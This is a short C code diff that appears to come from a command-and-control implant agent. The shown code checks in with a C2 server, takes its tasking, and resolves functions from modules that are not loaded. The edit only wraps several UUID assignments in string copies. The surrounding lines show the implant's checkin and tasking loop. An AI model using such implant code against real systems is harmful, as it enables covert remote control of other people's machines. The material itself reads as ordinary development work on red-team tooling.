@@ -31,7 +31,7 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 void perform_checkin(AgentParams *params, CheckinReply *reply, HttpHandle *http) {
 	// Generate checkin payload.
 	CheckinRequest checkin = { 0 };
-	checkin.payload_uuid = params->payload_uuid;
+	checkin.payload_uuid = clone_str(params->payload_uuid);
 	char *msg = generate_checkin_message(&checkin);
 	
 	// Send checkin payload to C2 server.
@@ -56,7 +56,7 @@ void perform_checkin(AgentParams *params, CheckinReply *reply, HttpHandle *http)
 void perform_tasking(AgentParams *params, TaskingReply *reply, HttpHandle *http) {
 	// Generate tasking payload.
 	TaskingRequest tasking = { 0 };
-	tasking.callback_uuid = params->callback_uuid;
+	tasking.callback_uuid = clone_str(params->callback_uuid);
 	tasking.tasking_size = 1;
 	char *msg = generate_tasking_message(&tasking);
 	
@@ -96,7 +96,7 @@ void go() {
 		return;
 	}
 	
-	params.callback_uuid = checkin_reply.callback_uuid;
+	params.callback_uuid = clone_str(checkin_reply.callback_uuid);
 	dprintf("Successful checkin with payload UUID %s and callback UUID %s", params.payload_uuid, params.callback_uuid);
 	
 	while (1) {
